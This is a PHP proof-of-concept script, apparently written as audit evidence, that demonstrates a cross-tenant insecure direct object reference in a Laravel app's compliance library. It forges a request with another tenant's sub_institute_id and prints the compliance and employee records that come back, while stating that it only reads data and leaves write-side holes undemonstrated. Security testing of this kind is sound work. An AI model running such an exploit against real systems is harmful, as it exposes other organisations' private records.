<?php
/**
 * F-1xx EVIDENCE — cross-tenant READ on the Compliance Library.
 *
 * READ ONLY. Nothing is written, updated or deleted. The write-side holes
 * (update/destroy with no tenant clause) are reported from the code, not
 * demonstrated, because demonstrating them would damage another tenant's data.
 *
 * Run on DEV. Tenant 1 and tenant 3 both hold master_compliance rows.
 */
DB::setDefaultConnection('mysql');
$db = DB::connection('mysql');

$victimTenant = 3;
$attackerTenant = 1;

// A real, ordinary user belonging to the ATTACKER's tenant.
$attacker = $db->table('tbluser')
    ->where('sub_institute_id', $attackerTenant)
    ->whereNotNull('user_profile_id')
    ->first(['id', 'first_name', 'sub_institute_id', 'user_profile_id']);

printf("Attacker: user #%d (%s), tenant %d\n", $attacker->id, $attacker->first_name, $attacker->sub_institute_id);
printf("Victim:   tenant %d, which holds %d compliance record(s)\n\n",
    $victimTenant,
    $db->table('master_compliance')->where('sub_institute_id', $victimTenant)->whereNull('deleted_at')->count());

$user = \App\Models\auth\tbluserModel::find($attacker->id);
$token = $user->createToken('idor-evidence')->plainTextToken;

// The attacker asks for the VICTIM's tenant id. Their token says tenant 1.
$request = \Illuminate\Http\Request::create('/x', 'GET', [
    'type' => 'API',
    'token' => $token,
    'sub_institute_id' => $victimTenant,   // <-- the only thing that decides the answer
    'syear' => date('Y'),
    'user_id' => $attacker->id,
    'formName' => 'compliance',
]);
$request->headers->set('Authorization', 'Bearer ' . $token);

$response = app(\App\Http\Controllers\settings\instituteDetailController::class)->index($request);
$body = json_decode($response->getContent(), true);

$user->tokens()->where('name', 'idor-evidence')->delete();

printf("HTTP %d\n", $response->getStatusCode());

$compliance = $body['complainceData'] ?? $body['data']['complainceData'] ?? null;
$employees = $body['userDetails'] ?? $body['data']['userDetails'] ?? null;

if (is_array($compliance)) {
    printf("\nCOMPLIANCE RECORDS RETURNED: %d\n", count($compliance));
    foreach (array_slice($compliance, 0, 3) as $row) {
        printf("  tenant=%s  id=%s  %s\n",
            $row['sub_institute_id'] ?? '?', $row['id'] ?? '?',
            mb_substr((string) ($row['standard_name'] ?? $row['compliance_name'] ?? ''), 0, 50));
    }
    $foreign = collect($compliance)->where('sub_institute_id', $victimTenant)->count();
    printf("\n  -> %d of them belong to tenant %d, which the caller is NOT a member of.\n", $foreign, $victimTenant);
} else {
    echo "\ncomplainceData not in the response. Raw keys: " . implode(', ', array_keys((array) $body)) . "\n";
    echo mb_substr($response->getContent(), 0, 400) . "\n";
}

if (is_array($employees)) {
    printf("\nEMPLOYEE RECORDS ALSO RETURNED: %d (from employeeDetails(\$sub_institute_id))\n", count($employees));
    foreach (array_slice($employees, 0, 3) as $e) {
        printf("  %s\n", mb_substr(json_encode(array_slice((array) $e, 0, 3)), 0, 90));
    }
}
